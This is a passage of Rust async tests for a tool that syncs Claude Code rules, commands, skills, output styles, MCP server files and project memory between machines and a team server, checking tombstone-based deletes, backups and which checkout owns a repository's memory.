        assert_eq!(read(&rules.join("new.md")), "NEW");
        assert_eq!(
            read(&rules.join("mine.md")),
            "MINE",
            "the member's own file stays"
        );
        assert!(!rules.join("retired.md").exists());
        // Not a sync of the member's personal key.
        assert!(!tmp.path().join("store").join("sync_baseline.json").exists());
        assert!(push_state.lock().await.known_version.is_empty());

        // The same team state again: nothing written, nothing muted.
        let past = SystemTime::now() - std::time::Duration::from_secs(3600);
        set_mtime(&rules.join("process.md"), past);
        let fresh = Arc::new(AsyncMutex::new(PushState::default()));
        mgr.do_pull_team(&fresh, None).await;
        assert_eq!(mtime_of(&rules.join("process.md")), past);
        assert!(fresh.lock().await.suppressed_until.is_empty());
    }

    #[tokio::test]
    async fn the_team_owner_applies_nothing_from_the_team_blob() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        admin.lock().unwrap().team_states.insert(
            ("t1".into(), "claude-rules".into()),
            (json!({"process.md": b64("stale mirror")}), 2),
        );
        let rules = tmp.path().join("home").join(".claude").join("rules");
        std::fs::create_dir_all(&rules).unwrap();
        std::fs::write(rules.join("process.md"), "owner's current").unwrap();
        let mgr = isolated_manager(&admin, tmp.path()).await;
        mgr.set_team(Some("t1".into()), Some("Team".into()), true)
            .await;
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        mgr.do_pull_team(&push_state, None).await;
        assert_eq!(read(&rules.join("process.md")), "owner's current");
        assert_eq!(
            admin
                .lock()
                .unwrap()
                .count("GET", "/api/tcb/teams/t1/state"),
            0
        );
    }

    // ---- Directory deletes ----

    #[tokio::test]
    async fn a_deleted_command_is_deleted_everywhere_and_stays_deleted() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        admin.lock().unwrap().states.insert(
            "claude-commands".into(),
            (json!({"old.md": b64("OLD"), "keep.md": b64("KEEP")}), 1),
        );
        let mgr = isolated_manager(&admin, tmp.path()).await;
        let dir = tmp.path().join("home").join(".claude").join("commands");
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        mgr.do_pull_all(&push_state, PullScope::Everything)
            .await
            .unwrap();
        assert_eq!(read(&dir.join("old.md")), "OLD");

        // The user retires old.md while Mnemos runs; the watcher pushes.
        push_state.lock().await.suppressed_until.clear();
        std::fs::remove_file(dir.join("old.md")).unwrap();
        let scope = mgr
            .classify(&event(&dir.join("old.md"), true), &push_state)
            .await;
        assert_eq!(scope, Some(DebounceScope::Directory("claude-commands")));
        mgr.push_directory("claude-commands", &push_state)
            .await
            .unwrap();
        let server = admin.lock().unwrap().states["claude-commands"].0.clone();
        assert!(server.get("old.md").is_none(), "{server}");
        assert!(server["__deleted"]["old.md"].as_i64().unwrap() > 0);
        assert_eq!(server["keep.md"], b64("KEEP"));

        // Next start (or the other machine pushing the key): it stays gone.
        let fresh = Arc::new(AsyncMutex::new(PushState::default()));
        mgr.do_pull_all(&fresh, PullScope::Everything)
            .await
            .unwrap();
        let _ = mgr.do_push_initial(&fresh).await;
        assert!(!dir.join("old.md").exists());
        assert!(admin.lock().unwrap().states["claude-commands"]
            .0
            .get("old.md")
            .is_none());

        // Moved back from the backups with its old mtime: it comes back.
        fresh.lock().await.suppressed_until.clear();
        std::fs::write(dir.join("old.md"), "OLD").unwrap();
        set_mtime(
            &dir.join("old.md"),
            UNIX_EPOCH + std::time::Duration::from_secs(1000),
        );
        mgr.classify(&event(&dir.join("old.md"), false), &fresh)
            .await;
        mgr.push_directory("claude-commands", &fresh).await.unwrap();
        let server = admin.lock().unwrap().states["claude-commands"].0.clone();
        assert_eq!(server["old.md"], b64("OLD"), "{server}");
        assert!(server.get("__deleted").is_none(), "{server}");
        assert_eq!(read(&dir.join("old.md")), "OLD");
    }

    #[tokio::test]
    async fn the_other_machines_delete_reaches_this_one_unless_edited_here_since() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        let deleted_at = now_ms() - 60_000;
        admin.lock().unwrap().states.insert(
            "claude-agents".into(),
            (
                json!({
                    "keep.md": b64("K"),
                    // An older build's union: the file and its tombstone.
                    "gone.md": b64("G"),
                    "__deleted": {"gone.md": deleted_at, "edited.md": deleted_at}
                }),
                3,
            ),
        );
        let home = tmp.path().join("home");
        let agents = home.join(".claude").join("agents");
        std::fs::create_dir_all(&agents).unwrap();
        std::fs::write(agents.join("gone.md"), "G").unwrap();
        set_mtime(
            &agents.join("gone.md"),
            UNIX_EPOCH + std::time::Duration::from_secs(1000),
        );
        // Edited here after the delete.
        std::fs::write(agents.join("edited.md"), "E2").unwrap();
        let mgr = isolated_manager(&admin, tmp.path()).await;
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));

        mgr.do_pull_all(&push_state, PullScope::Everything)
            .await
            .unwrap();
        assert!(!agents.join("gone.md").exists());
        assert_eq!(read(&backup_root(&home).join("agents/gone.md")), "G");
        assert_eq!(read(&agents.join("edited.md")), "E2");

        let _ = mgr.do_push_initial(&push_state).await;
        let server = admin.lock().unwrap().states["claude-agents"].0.clone();
        assert!(server.get("gone.md").is_none(), "{server}");
        assert_eq!(server["edited.md"], b64("E2"), "the later edit wins");
        assert_eq!(server["__deleted"], json!({"gone.md": deleted_at}));
    }

    #[tokio::test]
    async fn a_push_settles_local_files_the_server_deleted() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        let deleted_at = now_ms() - 60_000;
        admin.lock().unwrap().states.insert(
            "claude-rules".into(),
            (
                json!({"a.md": b64("A"), "__deleted": {"old.md": deleted_at}}),
                2,
            ),
        );
        let home = tmp.path().join("home");
        let rules = home.join(".claude").join("rules");
        std::fs::create_dir_all(&rules).unwrap();
        std::fs::write(rules.join("a.md"), "A").unwrap();
        std::fs::write(rules.join("old.md"), "O").unwrap();
        set_mtime(
            &rules.join("old.md"),
            UNIX_EPOCH + std::time::Duration::from_secs(1000),
        );
        let mgr = isolated_manager(&admin, tmp.path()).await;
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));

        mgr.push_directory("claude-rules", &push_state)
            .await
            .unwrap();
        assert!(!rules.join("old.md").exists());
        assert_eq!(read(&backup_root(&home).join("rules/old.md")), "O");
        let (server, version) = admin.lock().unwrap().states["claude-rules"].clone();
        assert!(server.get("old.md").is_none());
        assert_eq!(version, 2, "nothing new for the server");
    }

    #[tokio::test]
    async fn a_removed_skill_dir_deletes_its_files_but_a_gone_skills_dir_does_not_propagate() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        admin.lock().unwrap().states.insert(
            "claude-skills".into(),
            (
                json!({
                    "foo/SKILL.md": b64("F"),
                    "foo/ref.md": b64("R"),
                    "bar/SKILL.md": b64("B"),
                    "baz/SKILL.md": b64("Z")
                }),
                1,
            ),
        );
        let mgr = isolated_manager(&admin, tmp.path()).await;
        let skills = tmp.path().join("home").join(".claude").join("skills");
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        mgr.do_pull_all(&push_state, PullScope::Everything)
            .await
            .unwrap();
        push_state.lock().await.suppressed_until.clear();

        // macOS reports the moved skill directory by its own path only.
        std::fs::rename(skills.join("foo"), tmp.path().join("foo-retired")).unwrap();
        mgr.classify(&event(&skills.join("foo"), true), &push_state)
            .await;
        mgr.push_directory("claude-skills", &push_state)
            .await
            .unwrap();
        let server = admin.lock().unwrap().states["claude-skills"].0.clone();
        assert!(server.get("foo/SKILL.md").is_none(), "{server}");
        assert_eq!(
            server["__deleted"]
                .as_object()
                .unwrap()
                .keys()
                .collect::<Vec<_>>(),
            vec!["foo/SKILL.md", "foo/ref.md"]
        );

        // The skills directory itself gone (moved, renamed, not mounted) is
        // not taken as a decision: nothing is sent, and the next start
        // brings the files back.
        std::fs::remove_dir_all(&skills).unwrap();
        mgr.classify(&event(&skills, true), &push_state).await;
        mgr.push_directory("claude-skills", &push_state)
            .await
            .unwrap();
        let server = admin.lock().unwrap().states["claude-skills"].0.clone();
        assert_eq!(server["bar/SKILL.md"], b64("B"));
        assert_eq!(server["baz/SKILL.md"], b64("Z"));
        assert!(
            server["__deleted"].get("bar/SKILL.md").is_none(),
            "{server}"
        );
        assert!(push_state.lock().await.pending_dir_tombstones.is_empty());

        let restarted = isolated_manager(&admin, tmp.path()).await;
        let fresh = Arc::new(AsyncMutex::new(PushState::default()));
        restarted
            .do_pull_all(&fresh, PullScope::Everything)
            .await
            .unwrap();
        let _ = restarted.do_push_initial(&fresh).await;
        assert_eq!(read(&skills.join("bar/SKILL.md")), "B");
        assert_eq!(read(&skills.join("baz/SKILL.md")), "Z");
        assert!(!skills.join("foo").exists());
    }

    /// A restart (the full pull, then the initial push, on a new manager)
    /// neither brings `gone` back to `dir` nor puts it back on the server
    /// under `key`.
    async fn assert_stays_deleted(
        admin: &SharedAdmin,
        tmp: &Path,
        key: &str,
        dir: &Path,
        gone: &[&str],
    ) {
        let restarted = isolated_manager(admin, tmp).await;
        let fresh = Arc::new(AsyncMutex::new(PushState::default()));
        restarted
            .do_pull_all(&fresh, PullScope::Everything)
            .await
            .unwrap();
        let failed = restarted.do_push_initial(&fresh).await;
        assert!(failed.is_empty(), "{failed:?}");
        let server = admin.lock().unwrap().states[key].0.clone();
        for rel in gone {
            assert!(!dir.join(rel).exists(), "{rel} came back here");
            assert!(
                server.get(*rel).is_none(),
                "{rel} came back on the server: {server}"
            );
            assert!(
                server["__deleted"].get(*rel).is_some(),
                "{rel} lost its tombstone: {server}"
            );
        }
    }

    /// The server's files of a directory key, without its tombstones.
    fn server_files(admin: &SharedAdmin, key: &str) -> Vec<String> {
        let server = admin.lock().unwrap().states[key].0.clone();
        server
            .as_object()
            .unwrap()
            .keys()
            .filter(|k| *k != "__deleted")
            .cloned()
            .collect()
    }

    fn server_tombstones(admin: &SharedAdmin, key: &str) -> Vec<String> {
        let server = admin.lock().unwrap().states[key].0.clone();
        server["__deleted"]
            .as_object()
            .map(|t| t.keys().cloned().collect())
            .unwrap_or_default()
    }

    #[tokio::test]
    async fn deleting_two_of_three_commands_at_once_is_a_decision() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        admin.lock().unwrap().states.insert(
            "claude-commands".into(),
            (
                json!({"a.md": b64("A"), "b.md": b64("B"), "c.md": b64("C")}),
                1,
            ),
        );
        let mgr = isolated_manager(&admin, tmp.path()).await;
        let dir = tmp.path().join("home").join(".claude").join("commands");
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        mgr.do_pull_all(&push_state, PullScope::Everything)
            .await
            .unwrap();
        push_state.lock().await.suppressed_until.clear();

        for name in ["a.md", "b.md"] {
            std::fs::remove_file(dir.join(name)).unwrap();
            mgr.classify(&event(&dir.join(name), true), &push_state)
                .await;
        }
        mgr.push_directory("claude-commands", &push_state)
            .await
            .unwrap();
        assert_eq!(server_files(&admin, "claude-commands"), vec!["c.md"]);
        assert_eq!(
            server_tombstones(&admin, "claude-commands"),
            vec!["a.md", "b.md"]
        );

        assert_stays_deleted(
            &admin,
            tmp.path(),
            "claude-commands",
            &dir,
            &["a.md", "b.md"],
        )
        .await;
        assert_eq!(read(&dir.join("c.md")), "C");
    }

    #[tokio::test]
    async fn deleting_the_only_output_style_is_a_decision() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        admin.lock().unwrap().states.insert(
            "claude-output-styles".into(),
            (json!({"yaml.md": b64("Y")}), 1),
        );
        let mgr = isolated_manager(&admin, tmp.path()).await;
        let dir = tmp
            .path()
            .join("home")
            .join(".claude")
            .join("output-styles");
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        mgr.do_pull_all(&push_state, PullScope::Everything)
            .await
            .unwrap();
        push_state.lock().await.suppressed_until.clear();

        // The directory stays, empty.
        std::fs::remove_file(dir.join("yaml.md")).unwrap();
        mgr.classify(&event(&dir.join("yaml.md"), true), &push_state)
            .await;
        mgr.push_directory("claude-output-styles", &push_state)
            .await
            .unwrap();
        assert!(server_files(&admin, "claude-output-styles").is_empty());
        assert_eq!(
            server_tombstones(&admin, "claude-output-styles"),
            vec!["yaml.md"]
        );

        assert_stays_deleted(
            &admin,
            tmp.path(),
            "claude-output-styles",
            &dir,
            &["yaml.md"],
        )
        .await;
    }

    #[tokio::test]
    async fn deleting_a_three_file_skill_next_to_two_small_ones_is_a_decision() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        admin.lock().unwrap().states.insert(
            "claude-skills".into(),
            (
                json!({
                    "big/SKILL.md": b64("S"),
                    "big/ref.md": b64("R"),
                    "big/config.json": b64("{}"),
                    "one/SKILL.md": b64("1"),
                    "two/SKILL.md": b64("2")
                }),
                1,
            ),
        );
        let mgr = isolated_manager(&admin, tmp.path()).await;
        let skills = tmp.path().join("home").join(".claude").join("skills");
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        mgr.do_pull_all(&push_state, PullScope::Everything)
            .await
            .unwrap();
        push_state.lock().await.suppressed_until.clear();

        // Reported by the skill directory's own path, as on macOS.
        std::fs::remove_dir_all(skills.join("big")).unwrap();
        mgr.classify(&event(&skills.join("big"), true), &push_state)
            .await;
        mgr.push_directory("claude-skills", &push_state)
            .await
            .unwrap();
        assert_eq!(
            server_files(&admin, "claude-skills"),
            vec!["one/SKILL.md", "two/SKILL.md"]
        );
        assert_eq!(
            server_tombstones(&admin, "claude-skills"),
            vec!["big/SKILL.md", "big/config.json", "big/ref.md"]
        );

        assert_stays_deleted(
            &admin,
            tmp.path(),
            "claude-skills",
            &skills,
            &["big/SKILL.md", "big/ref.md", "big/config.json"],
        )
        .await;
        assert_eq!(read(&skills.join("one/SKILL.md")), "1");
        assert_eq!(read(&skills.join("two/SKILL.md")), "2");
    }

    #[tokio::test]
    async fn a_platform_specific_delete_stays_in_this_platforms_slot() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        let this = current_platform();
        let other = if this == "win32" { "darwin" } else { "win32" };
        admin.lock().unwrap().states.insert(
            "claude-mcp-servers".into(),
            (
                json!({ this: {"a.py": b64("A"), "b.py": b64("B")}, other: {"b.py": b64("theirs")} }),
                1,
            ),
        );
        let mgr = isolated_manager(&admin, tmp.path()).await;
        let dir = tmp.path().join("home").join(".claude").join("mcp-servers");
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        mgr.do_pull_all(&push_state, PullScope::Everything)
            .await
            .unwrap();
        push_state.lock().await.suppressed_until.clear();

        std::fs::remove_file(dir.join("b.py")).unwrap();
        mgr.classify(&event(&dir.join("b.py"), true), &push_state)
            .await;
        mgr.push_directory("claude-mcp-servers", &push_state)
            .await
            .unwrap();
        let server = admin.lock().unwrap().states["claude-mcp-servers"].0.clone();
        assert!(server[this].get("b.py").is_none(), "{server}");
        assert!(server[this]["__deleted"]["b.py"].is_i64());
        assert_eq!(server[other], json!({"b.py": b64("theirs")}));
    }

    // ---- Memory deletes ----

    const MEM_KEY: &str = "claude-memory:pid:o/x";

    /// A manager over `admin` with a checkout of `o/x` registered under
    /// `tmp`, signed in as profile `pid`. Returns it and the checkout's
    /// `~/.claude/projects/<slug>` dir.
    async fn memory_manager(admin: &SharedAdmin, tmp: &Path) -> (Arc<SyncManager>, PathBuf) {
        let checkout = tmp.join("code").join("x");
        std::fs::create_dir_all(&checkout).unwrap();
        let mut rec = record_here("p1", "x", &checkout.to_string_lossy());
        rec["gitRepo"] = json!("o/x");
        write_registry(&tmp.join("store"), vec![rec]);
        let mgr = isolated_manager(admin, tmp).await;
        *mgr.profile_id.lock().await = Some("pid".into());
        let project = memory_dir_for_root(
            &tmp.join("home").join(".claude").join("projects"),
            &checkout,
        )
        .unwrap();
        (mgr, project)
    }

    fn event(path: &Path, is_remove: bool) -> crate::watcher::ChangeEvent {
        crate::watcher::ChangeEvent {
            paths: vec![path.to_path_buf()],
            is_remove,
        }
    }

    fn mem_file(content: &str, mtime: i64) -> Value {
        json!({"content": B64.encode(content), "mtime": mtime})
    }

    #[tokio::test]
    async fn a_deleted_memory_file_is_deleted_everywhere_and_stays_deleted() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        admin.lock().unwrap().states.insert(
            MEM_KEY.into(),
            (
                json!({"files": {"a.md": mem_file("A", 1000), "b.md": mem_file("B", 1000)}, "memoryMd": null}),
                1,
            ),
        );
        let (mgr, project) = memory_manager(&admin, tmp.path()).await;
        let memory = project.join("memory");
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        mgr.do_pull_all(&push_state, PullScope::Everything)
            .await
            .unwrap();
        assert_eq!(read(&memory.join("b.md")), "B");
        // Pulled and pushed straight back: nothing new for the server.
        mgr.push_memory(MEM_KEY, &push_state).await.unwrap();
        assert!(
            admin.lock().unwrap().puts.is_empty(),
            "{:?}",
            admin.lock().unwrap().puts
        );

        // Past the pull's echo window, the user deletes b.md.
        push_state.lock().await.suppressed_until.clear();
        std::fs::remove_file(memory.join("b.md")).unwrap();
        let scope = mgr
            .classify(&event(&memory.join("b.md"), true), &push_state)
            .await;
        assert_eq!(scope, Some(DebounceScope::Memory(MEM_KEY.into())));
        mgr.push_memory(MEM_KEY, &push_state).await.unwrap();

        let server = admin.lock().unwrap().states[MEM_KEY].0.clone();
        assert!(server.pointer("/files/b.md").is_none(), "{server}");
        assert!(server.pointer("/files/a.md").is_some());
        assert!(server["__deleted_at"]["memory/b.md"].as_i64().unwrap() > 1000);
        assert_eq!(
            server["__deleted_files"],
            json!(["memory/b.md"]),
            "for older builds"
        );
        assert!(push_state.lock().await.pending_memory_tombstones.is_empty());

        // A fresh start does not bring it back.
        let fresh = Arc::new(AsyncMutex::new(PushState::default()));
        mgr.do_pull_all(&fresh, PullScope::Everything)
            .await
            .unwrap();
        assert!(!memory.join("b.md").exists());

        // Moved back from a backup, keeping its old mtime: it comes back
        // everywhere, and older builds stop deleting it.
        fresh.lock().await.suppressed_until.clear();
        std::fs::write(memory.join("b.md"), "B").unwrap();
        set_mtime(
            &memory.join("b.md"),
            UNIX_EPOCH + std::time::Duration::from_millis(1000),
        );
        let scope = mgr
            .classify(&event(&memory.join("b.md"), false), &fresh)
            .await;
        assert_eq!(scope, Some(DebounceScope::Memory(MEM_KEY.into())));
        mgr.push_memory(MEM_KEY, &fresh).await.unwrap();
        let server = admin.lock().unwrap().states[MEM_KEY].0.clone();
        assert_eq!(
            server.pointer("/files/b.md/content"),
            Some(&json!(B64.encode("B")))
        );
        assert!(server.get("__deleted_at").is_none(), "{server}");
        assert!(server.get("__deleted_files").is_none(), "{server}");
        assert!(server.get("__revived").is_none());
    }

    #[tokio::test]
    async fn the_other_machines_memory_delete_moves_the_file_to_the_backups() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        let now = now_ms();
        admin.lock().unwrap().states.insert(
            MEM_KEY.into(),
            (
                json!({
                    "files": {"a.md": mem_file("A", 1000)},
                    "memoryMd": null,
                    "__deleted_at": {"memory/b.md": now, "memory/c.md": 500, "../x.jsonl": now},
                    "__deleted_files": ["memory/b.md", "memory/c.md", "memory/legacy.md"]
                }),
                4,
            ),
        );
        let (mgr, project) = memory_manager(&admin, tmp.path()).await;
        let memory = project.join("memory");
        std::fs::create_dir_all(&memory).unwrap();
        std::fs::write(memory.join("b.md"), "B").unwrap();
        set_mtime(
            &memory.join("b.md"),
            UNIX_EPOCH + std::time::Duration::from_millis(1000),
        );
        // Edited here after the other machine deleted it.
        std::fs::write(memory.join("c.md"), "C").unwrap();
        // Only an older writer's list names it: never deleted.
        std::fs::write(memory.join("legacy.md"), "L").unwrap();
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        mgr.do_pull_all(&push_state, PullScope::Everything)
            .await
            .unwrap();

        assert!(!memory.join("b.md").exists());
        let home = tmp.path().join("home");
        let slug = project.file_name().unwrap().to_string_lossy().into_owned();
        assert_eq!(
            read(
                &backup_root(&home)
                    .join("projects")
                    .join(&slug)
                    .join("memory/b.md")
            ),
            "B"
        );
        assert_eq!(read(&memory.join("c.md")), "C");
        assert_eq!(read(&memory.join("legacy.md")), "L");
        assert_eq!(read(&memory.join("a.md")), "A");
    }

    #[tokio::test]
    async fn memory_deletes_propagate_unless_nothing_is_left() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        admin.lock().unwrap().states.insert(
            MEM_KEY.into(),
            (
                json!({
                    "files": {
                        "a.md": mem_file("A", 1000),
                        "e.md": mem_file("E", 1000),
                        "sub/c.md": mem_file("C", 1000),
                        "sub/d.md": mem_file("D", 1000)
                    },
                    "memoryMd": mem_file("M", 1000)
                }),
                1,
            ),
        );
        let (mgr, project) = memory_manager(&admin, tmp.path()).await;
        let memory = project.join("memory");
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        mgr.do_pull_all(&push_state, PullScope::Everything)
            .await
            .unwrap();
        push_state.lock().await.suppressed_until.clear();

        // macOS reports a moved directory by its own path only.
        std::fs::rename(memory.join("sub"), tmp.path().join("sub-moved")).unwrap();
        mgr.classify(&event(&memory.join("sub"), true), &push_state)
            .await;
        mgr.push_memory(MEM_KEY, &push_state).await.unwrap();
        let server = admin.lock().unwrap().states[MEM_KEY].0.clone();
        assert!(server.pointer("/files/sub~1c.md").is_none(), "{server}");
        assert_eq!(
            server["__deleted_at"]
                .as_object()
                .unwrap()
                .keys()
                .collect::<Vec<_>>(),
            vec!["memory/sub/c.md", "memory/sub/d.md"]
        );

        // Both remaining memory files at once, MEMORY.md kept: still a
        // decision, and a fresh start does not bring them back.
        for name in ["a.md", "e.md"] {
            std::fs::remove_file(memory.join(name)).unwrap();
            mgr.classify(&event(&memory.join(name), true), &push_state)
                .await;
        }
        mgr.push_memory(MEM_KEY, &push_state).await.unwrap();
        let server = admin.lock().unwrap().states[MEM_KEY].0.clone();
        assert_eq!(server["files"], json!({}), "{server}");
        assert!(server["__deleted_at"]["memory/a.md"].is_i64(), "{server}");
        assert!(server["__deleted_at"]["memory/e.md"].is_i64(), "{server}");
        let fresh = Arc::new(AsyncMutex::new(PushState::default()));
        mgr.do_pull_all(&fresh, PullScope::Everything)
            .await
            .unwrap();
        let _ = mgr.do_push_initial(&fresh).await;
        assert!(!memory.join("a.md").exists());
        assert!(!memory.join("e.md").exists());
        assert!(admin.lock().unwrap().states[MEM_KEY]
            .0
            .pointer("/files/a.md")
            .is_none());

        // No memory file and no MEMORY.md left looks like a moved or lost
        // project dir, not a decision: it is not sent.
        fresh.lock().await.suppressed_until.clear();
        std::fs::remove_dir_all(&memory).unwrap();
        std::fs::remove_file(project.join("MEMORY.md")).unwrap();
        mgr.classify(&event(&memory, true), &fresh).await;
        mgr.classify(&event(&project.join("MEMORY.md"), true), &fresh)
            .await;
        mgr.push_memory(MEM_KEY, &fresh).await.unwrap();
        let server = admin.lock().unwrap().states[MEM_KEY].0.clone();
        assert!(server["memoryMd"].is_object(), "{server}");
        assert!(
            server["__deleted_at"].get("MEMORY.md").is_none(),
            "{server}"
        );
        assert!(fresh.lock().await.pending_memory_tombstones.is_empty());
    }

    // ---- Output styles ----

    #[tokio::test]
    async fn output_styles_sync_like_the_other_dirs_but_stay_off_the_team() {
        assert!(!SHAREABLE_TEAM_KEYS.contains(&"claude-output-styles"));
        assert!(initial_push_scopes().contains(&DebounceScope::Directory("claude-output-styles")));
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        admin.lock().unwrap().states.insert(
            "claude-output-styles".into(),
            (json!({"terse.md": b64("T")}), 1),
        );
        let styles = tmp
            .path()
            .join("home")
            .join(".claude")
            .join("output-styles");
        std::fs::create_dir_all(&styles).unwrap();
        std::fs::write(styles.join("yaml.md"), "Y").unwrap();
        let mgr = isolated_manager(&admin, tmp.path()).await;
        assert!(mgr.collect_watch_paths().iter().any(|t| t.path == styles));
        mgr.set_team(Some("t1".into()), Some("Team".into()), true)
            .await;
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));

        // Merged per file: each machine keeps the other's styles.
        mgr.push_directory("claude-output-styles", &push_state)
            .await
            .unwrap();
        let a = admin.lock().unwrap();
        assert_eq!(
            a.states["claude-output-styles"].0,
            json!({"terse.md": b64("T"), "yaml.md": b64("Y")})
        );
        assert!(a.team_states.is_empty(), "never mirrored to the team");
    }

    // ---- Two checkouts of one repo ----

    #[tokio::test]
    async fn the_checkout_named_like_the_repo_speaks_for_its_memory() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        let code = tmp.path().join("code");
        let nested = code
            .join("Admin")
            .join(".claude")
            .join("apps")
            .join("TwinCurrent-Build");
        let tcb = code.join("TCB");
        std::fs::create_dir_all(&nested).unwrap();
        std::fs::create_dir_all(&tcb).unwrap();
        let mut first = record_here("tb", "TwinCurrent-Build", &nested.to_string_lossy());
        first["gitRepo"] = json!("bob/TCB");
        let mut second = record_here("tcb", "TCB", &tcb.to_string_lossy());
        second["gitRepo"] = json!("bob/TCB");
        second["createdAt"] = json!("2026-09-02T00:00:00Z");
        write_registry(&tmp.path().join("store"), vec![first, second]);
        let mgr = isolated_manager(&admin, tmp.path()).await;
        *mgr.profile_id.lock().await = Some("pid".into());
        let projects = tmp.path().join("home").join(".claude").join("projects");
        let nested_mem = memory_dir_for_root(&projects, &nested)
            .unwrap()
            .join("memory");
        let ide_mem = memory_dir_for_root(&projects, &tcb).unwrap().join("memory");
        std::fs::create_dir_all(&nested_mem).unwrap();
        std::fs::create_dir_all(&ide_mem).unwrap();
        std::fs::write(nested_mem.join("stale.md"), "old").unwrap();
        std::fs::write(ide_mem.join("real.md"), "new").unwrap();

        assert_eq!(mgr.resolve_repo_root("bob/TCB").await, Some(tcb.clone()));
        assert_eq!(
            mgr.list_local_memory_projects().await,
            vec![(
                "bob/TCB".to_string(),
                ide_mem.parent().unwrap().to_path_buf()
            )]
        );
        assert_eq!(
            mgr.project_id_for_repo("bob/TCB").await.as_deref(),
            Some("tcb")
        );

        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        let key = "claude-memory:pid:bob/TCB".to_string();
        assert_eq!(
            mgr.classify(&event(&ide_mem.join("real.md"), false), &push_state)
                .await,
            Some(DebounceScope::Memory(key.clone()))
        );
        // The other checkout's memory shares the key but not the dir.
        std::fs::remove_file(nested_mem.join("stale.md")).unwrap();
        assert_eq!(
            mgr.classify(&event(&nested_mem.join("stale.md"), true), &push_state)
                .await,
            None
        );
        assert!(push_state.lock().await.pending_memory_tombstones.is_empty());

        mgr.push_memory(&key, &push_state).await.unwrap();
        let server = admin.lock().unwrap().states[&key].0.clone();
        assert!(server.pointer("/files/real.md").is_some());
        assert!(server.pointer("/files/stale.md").is_none(), "{server}");
    }

    #[test]
    fn pick_memory_record_prefers_spelling_then_folder_name_then_age() {
        let (_tmp, mut store) = store_with(vec![
            {
                let mut r = ide_record("old", "x", "2025-01-01T00:00:00Z");
                r["gitRepo"] = json!("acme/tcb");
                r
            },
            ide_record("young", "TCB", "2026-06-01T00:00:00Z"),
            ide_record("older", "y", "2026-01-01T00:00:00Z"),
        ]);
        let root = |id: &str| -> Option<PathBuf> {
            Some(PathBuf::from(match id {
                "old" => "/c/TCB",
                "young" => "/c/elsewhere",
                "older" => "/c/tcb",
                _ => return None,
            }))
        };
        let pick = |store: &mut ProjectStore, resolvable: &[&str]| {
            pick_memory_record(store, "acme/TCB", |_, id| {
                resolvable.contains(&id).then(|| root(id)).flatten()
            })
            .map(|(id, _)| id)
        };
        // Exact spelling beats a folder named like the repo...
        assert_eq!(
            pick(&mut store, &["old", "young"]).as_deref(),
            Some("young")
        );
        // ...a folder named like the repo beats age...
        assert_eq!(
            pick(&mut store, &["young", "older"]).as_deref(),
            Some("older")
        );
        // ...and only what resolves counts.
        assert_eq!(pick(&mut store, &["old"]).as_deref(), Some("old"));
        assert_eq!(pick(&mut store, &[]), None);
    }

    // ---- Memory dirs ----

    #[test]
    fn memory_dir_is_claude_codes_slug_of_the_local_checkout() {
        let base = Path::new("claude-projects");
        assert_eq!(
            memory_dir_for_root(base, Path::new(r"C:\code\Ledger_App")),
            Some(base.join("C--code-Ledger-App"))
        );
        assert_eq!(
            memory_dir_for_root(
                base,
                Path::new("/Users/alice/code/Admin/.claude/apps/TwinCurrent-Build")
            ),
            Some(base.join("-Users-alice-code-Admin--claude-apps-TwinCurrent-Build"))
        );
        let too_long = format!("/{}", "a".repeat(300));
        assert_eq!(memory_dir_for_root(base, Path::new(&too_long)), None);
    }

    #[test]
    fn dir_names_compare_case_insensitively_off_linux() {
        assert!(same_dir_name("C--code-mnemos", "c--code-mnemos", "win32"));
        assert!(same_dir_name(
            "-Users-alice-Code",
            "-Users-alice-code",
            "darwin"
        ));
        assert!(!same_dir_name(
            "-home-alice-Code",
            "-home-alice-code",
            "linux"
        ));
    }

    fn store_with(records: Vec<Value>) -> (tempfile::TempDir, ProjectStore) {
        let tmp = tempfile::tempdir().unwrap();
        write_registry(tmp.path(), records);
        let store = ProjectStore::load_blocking_from(
            tmp.path().join("projects.json"),
            tmp.path().join("workspace_state.json"),
        )
        .unwrap();
        (tmp, store)
    }

    fn ide_record(id: &str, name: &str, created: &str) -> Value {
        let mut r = record(id, name, &format!("/Users/alice/code/{name}"));
        r["gitRepo"] = json!("acme/TCB");
        r["createdAt"] = json!(created);
        r
    }

    #[test]
    fn learn_fills_one_empty_slot_and_never_overwrites() {
        let mut filled = ide_record("filled", "tcbv2", "2025-01-01T00:00:00Z");
        filled["paths"] = json!({"win32": "C:\\code\\tcb-old"});
        let older = ide_record("older", "TCB", "2026-01-01T00:00:00Z");
        let named = ide_record("named", "mnemos", "2026-06-01T00:00:00Z");
        let (_tmp, mut store) = store_with(vec![filled, older, named]);
        let learn = |store: &mut ProjectStore, root: &str| {
            learn_platform_path_in(store, "acme/tcb", Path::new(root), "win32")
        };

